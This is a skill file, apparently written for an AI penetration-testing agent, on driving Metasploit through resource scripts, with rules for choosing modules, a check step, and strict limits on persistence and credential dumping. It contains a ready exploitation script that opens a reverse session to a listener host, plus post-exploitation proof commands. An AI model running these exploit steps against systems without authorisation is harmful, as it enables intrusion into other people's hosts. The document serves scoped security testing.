---
name: metasploit
description: Drive Metasploit non-interactively (msfconsole -x / -r resource scripts) for module matching, check mode, and single-shot exploitation under the deeptool gate during L2-L4.
---

# Metasploit, non-interactive

Checked-in image ships `msfconsole` (Rapid7 framework). There is no GUI and no RPC session: the
agent drives it with resource scripts, which are reproducible and reviewable — that is the point.

## Find the module before doing anything

```bash
# search by product, CVE, or platform
msfconsole -q -x "search cve:2026-109618; exit"

# details of one module (options, targets, references)
msfconsole -q -x "info exploit/linux/http/xxx; exit"
```

Rules for choosing a module:

1. Prefer a module whose `References` list the CVE you actually fingerprinted.
2. Prefer `auxiliary/scanner/*` over `exploit/*` when all you need is detection.
3. If two modules fit, pick the one with a `Check` method — it separates "reachable" from "vulnerable".
4. Never run a module whose `Targets` do not include the version you observed.

## The three safe steps, in order

```bash
# 1) Check — no exploitation, answers "is this instance affected?"
cat > /tmp/msf-check.rc <<'RC'
set RHOSTS 10.0.0.5
set RPORT 8443
set SSL true
set VERBOSE false
check
exit
RC
deeptool run --key msf-check-<cve> -- msfconsole -q -r /tmp/msf-check.rc

# 2) Detection-only auxiliary module (scanner), same shape
# 3) Single-shot exploitation — L2/L3 only, after a Check said vulnerable
```

## Exploitation, if and only if

- `deeptool status` shows `enabled: true` with the level you need;
- a `check` returned `The target is vulnerable` (or the finding is already proven by another route
  and the module is only being used for the payload);
- the module has `run` semantics that do not establish persistence by default.

```bash
cat > /tmp/msf-run.rc <<'RC'
set RHOSTS 10.0.0.5
set RPORT 8443
set SSL true
set LHOST 10.99.0.10
set LPORT 4444
set ExitOnSession true
set AutoRunScript ""
run
exit
RC
deeptool run --key msf-exploit-<cve> -- msfconsole -q -r /tmp/msf-run.rc
```

Hard limits, non-negotiable:

1. **No persistence modules** (cron, service install, ssh keys, `post/*/manage/*`). Creating an
   *application* account is allowed (see `exploit-depth`); creating a *system* foothold is not.
2. **No mass collection.** One session, one command at a time. No `sessions -C` loops over hosts,
   no `db_export`, no dumping a table through a session.
3. **No post-exploitation modules before L4.** `post/` modules are L4 only.
4. **No `msfvenom` payloads delivered to real users.** Phishing-style delivery is out of scope.
5. **Close the session immediately** (`sessions -K`) after the minimum proof: `id`, `hostname`, one
   file listing. Do not explore the host — a shell on a government server is already an incident.
6. **No `hashdump`, no credential dumping** unless the engagement explicitly asks, at L4, on a
   snapshot.
7. If a module crashes the service (5xx storm, dropped connection), stop the run and note it — that
   is an availability incident you caused. Do not retry the module: two attempts per hypothesis, then
   close the path.

## Reading the output

`msfconsole -q -x` prints the banner noise to stderr and module output to stdout. Capture both:

```bash
msfconsole -q -r /tmp/msf-run.rc 2>&1 | tee /tmp/msf-run.log
```

Keep `/tmp/msf-run.log` and bind it as evidence; the exit status of `msfconsole` is not a finding on
its own (`0` even on failure).

## After the run

- `sessions -K` to close everything, then confirm with `sessions -l`.
- Remove `/tmp/msf-*.rc` and `/tmp/msf-*.log` only after the evidence is copied into the evidence
  store.
- Record in the finding: module path, `check` result verbatim, exact `set` values (masked where they
  are credentials), and what the session proved.

## When not to use Metasploit

- The weakness is an application-logic flaw (IDOR, mass assignment, broken authz): Metasploit has no
  module for it, and `curl` + `deeptool run` is the honest tool.
- The CVE needs a payload the client cannot tolerate (DoS-class CVEs). Detection only, then stop.
- You cannot name the version with evidence. Guessing a module from an unconfirmed banner produces
  false negatives that look like "patched".
